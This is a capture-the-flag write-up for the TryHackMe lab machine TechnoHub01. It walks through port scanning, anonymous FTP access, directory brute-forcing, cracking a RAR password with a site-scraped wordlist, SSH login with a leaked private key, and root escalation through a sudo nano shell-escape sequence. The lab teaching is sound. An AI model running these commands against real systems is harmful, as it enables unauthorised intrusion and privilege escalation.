
# TechnoHub01
## This writeup is about the [Try Hack Me](https://tryhackme.com) machine [TechnoHub01](https://tryhackme.com/room/technohub01)

Room: https://tryhackme.com/room/technohub01

![image](https://github.com/user-attachments/assets/8074def3-dbc7-4085-b876-ae3c909806cb)


## after starting the machine 1st step will be the network enumeration

```
rustscan -a 10.10.89.166
```

![image](https://github.com/user-attachments/assets/6d4d1da4-aec7-4187-b499-229b0a96a112)


## We can notice that we have three open ports:

### *Port 21 FTP* ###

### *Port 22 SSH* ###

### *Port 80 HTTP* ###

I would try to test ftp for anonymous access

```
nmap 10.10.89.166 -p 21 --script ftp-anon
```

![image](https://github.com/user-attachments/assets/3feced8a-faa5-4ac0-8527-e3964c88810c)



**It allow anonymous access**


![image](https://github.com/user-attachments/assets/c6060fda-da50-4a5c-8120-3cf814954b6d)


We get two documents, a note and a pcap traffic capture, which would be interesting, so let's download them.

```
mget *
```

lets examine what we get


![image](https://github.com/user-attachments/assets/c30f02b7-7315-43c8-8342-6316b7450f96)

It is a note from the CFO to Hana, and it sounds like Hana is in the managerial position of the SOC team.
Also, we have a higher-level manager, Miss Yassmin.
After a long time examination of the pcap file, it is a rabbit hole.

![image](https://github.com/user-attachments/assets/10c2fbfd-123c-4958-b25e-b2b7379f1768)


## Now, we are done with the FTP. The information we get is:

### *1- the CFO is Asser Mahmoud* ###

### *2- Technical manager Haman* ###
### *3- Miss Yassmin, the Higher manager* ###



**Now, it's time to try the next port/service. Port 80**

First, let's check the website.


![image](https://github.com/user-attachments/assets/b47967eb-5076-41d3-8cea-e41a040591bb)

We have five pages [**Home**, **Sales**, **Maintenance Service**, **Contact Us**, and **Our Team**].

Going through the different pages, nothing interesting else:

The **Contact Us** page has an [Email address](mailto:technohubwrx@gmail.com), [YouTube channel handle](https://www.youtube.com/@techno_hub), and [Instagram handle](https://www.instagram.com/technohubrwx).

On the **Our Team** page, we get information about the team.


### *CEO: Yassmin Hamdy* ###
### *Email: yhamdy@technohub* ###

### *CFO: Asser Mahmoud* ###
### *Email: amahmoud@technohub* ###

### *CTO: Hana Neana* ###
### *Email: hneana@technohub* ###

on the other-hand directory, brute forcing reviles unlinked directory **backup**

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.89.166/FUZZ
```

![image](https://github.com/user-attachments/assets/c26faade-bd5e-4d93-bec2-0ca413454dd0)

So, let's go inside this directory.

*Oh, We get a backup rar file.*

![image](https://github.com/user-attachments/assets/b436f89e-5bf8-4503-916b-c2c2c27faf56)


```
curl http://10.10.89.166/backup/TechnoHub.rar -o TechnoHub.rar
```


But it's password protected, so we need to crack the password. We will use **JTR** to get the password hash.


```
rar2john TechnoHub.rar >hash.txt
```


The password is not in rockyou.txt, but scrapping the website would be helpful sometimes.

```
cewl http://10.10.89.166 > list.txt
```

Now it is time to crack something 😉

```
john --wordlist=list.txt hash.txt
```

![image](https://github.com/user-attachments/assets/8d830c17-028b-4661-ab27-677a3f87b663)

After extracting the file with the discovered password, we now have the server backup, including an OpenSSH private key.

![image](https://github.com/user-attachments/assets/b6d8e5d1-879d-498b-9ab1-7db285d8b8cd)

![image](https://github.com/user-attachments/assets/786647c0-b933-42b8-8c8d-70b297850a64)


All that we need to do is to set it private and connect to the 3rd open port we have on the machine, port 22 (SSH)

```
chmod 600 id_ed25519
```

Remember, we get three users on the company from the website.


### *CEO: Yassmin Hamdy* ###
### *Email: yhamdy@technohub* ###

### *CFO: Asser Mahmoud* ###
### *Email: amahmoud@technohub* ###

### *CTO: Hana Neana* ###
### *Email: hneana@technohub* ###

Because this SSH key is in the backup, it might be reasonable to assume it belongs to a technical user. We only have the CTO account, **Henneana**.

```
ssh -i id_ed25519 -l hneana 10.10.89.166
```
### Now we get our initial access to the *TechnoHub* machine.

![image](https://github.com/user-attachments/assets/882b648b-d3a3-420e-86e9-82d2eb2e15c7)


Inside, we can find the user.txt file (this is the 1st flag)

```
drwxr-x--- 5 hneana hneana 4096 Apr  9 23:55 .
drwxr-xr-x 6 root   root   4096 Apr  9 23:38 ..
lrwxrwxrwx 1 hneana hneana    9 Apr  9 22:58 .bash_history -> /dev/null
-rw-r--r-- 1 hneana hneana  220 Apr  9 20:14 .bash_logout
-rw-r--r-- 1 hneana hneana 3797 Apr  9 22:54 .bashrc
drwx------ 2 hneana hneana 4096 Apr  9 22:38 .cache
drwxrwxr-x 3 hneana hneana 4096 Apr  9 20:25 .local
-rw-r--r-- 1 hneana hneana  807 Apr  9 20:14 .profile
drwx------ 2 hneana hneana 4096 Apr  9 22:52 .ssh
-rw-rw-r-- 1 hneana hneana   33 Apr  9 20:28 user.txt
```

## enumerating the user *hneana*:


![image](https://github.com/user-attachments/assets/ab85e9cf-f878-4406-9434-e83f9801cd65)

She can run **nano** with sudo permission; now it is time for [gtfobins](https://gtfobins.github.io/)

![image](https://github.com/user-attachments/assets/6964c0be-da13-41e1-ba96-92c5c0d50c66)


```
sudo nano

^R^X

reset; sh 1>&0 2>&0
```


And now we get **root** access.

```
# whoami
root
# ls -al /root
total 36
drwx------  5 root root 4096 Apr  9 20:12 .
drwxr-xr-x 20 root root 4096 Apr  9 19:57 ..
-rw-------  1 root root 3651 Apr  9 23:55 .bash_history
-rw-r--r--  1 root root 3106 Oct  7  2024 .bashrc
drwx------  3 root root 4096 Apr  9 20:09 .cache
drwxr-xr-x  3 root root 4096 Apr  9 20:09 .local
-rw-r--r--  1 root root  161 Oct  7  2024 .profile
drwx------  2 root root 4096 Apr  9 20:08 .ssh
-rw-r--r--  1 root root   33 Apr  9 20:12 root.txt
# cat /root/root.txt
```


# This was the walkthrough for the *TechnoHub* 1st CTF machine.
